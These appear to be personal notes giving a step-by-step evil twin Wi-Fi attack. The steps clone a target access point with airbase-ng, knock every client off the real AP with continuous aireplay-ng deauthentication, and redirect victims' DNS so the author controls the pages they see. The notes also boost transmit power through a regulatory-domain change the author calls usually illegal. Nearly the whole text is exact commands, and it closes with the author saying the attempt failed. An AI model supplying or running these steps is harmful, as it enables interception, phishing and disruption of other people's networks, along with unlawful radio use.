To clone an Access Point, deauthenticate all devices that were connecting to original AP, and let them connect to me.
Also, modify DNS server record and I can control what webpage they see.

Need tools:
- airbase-ng, for cloning
- aireplay-ng, to deauth devices

1. config wlp3s0
    ifconfig wlp3s0 down
    iwconfig wlp3s0 mode monitor (airmon-ng start wlp3s0, to print more info)
    airmon-ng check wlp3s0, kill the PIDs 
2. airodump-ng wlp3s0, to scan all alive APs
    find the target AP's MAC, and channel
3. clone it using "airbase-ng -a [AP's MAC] --essid ["SSID Name"] -c [channel] mon0"
    This step creates a fake AP with same SSID & MAC as the original AP.
    mon0 is default, use airmon-ng start wlp3s0 to check mon0
4. deauth all devices connected to original AP, so that when they try to reconnect, they will connect to me
    aireplay-ng -0 0 -a [AP's MAC] wlp3s0
    (to deauth a specific device, aireplay-ng -0 0 -a [AP's MAC] -c [device's MAC] wlp3s0)
    (may need to use "iwconfig wlp3s0 channel [#]" to change channel first)
    Note: My Fake AP's signal strength must be stronger in order for this to be successfull.

To power up my Fake AP,
    in /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf, change the "wifi.powersave" value to 2
    iw reg set BO (set reg to Bolivian..., this is usually illegal!!!)
    iwconfig wlp3s0 txpower 27
    iwconfig to check if the configuration worked

Tried this, but for some reason, I can't make my victim device connect to my fake AP.
And for some reason, I can't change the txpower on wlp3s0.
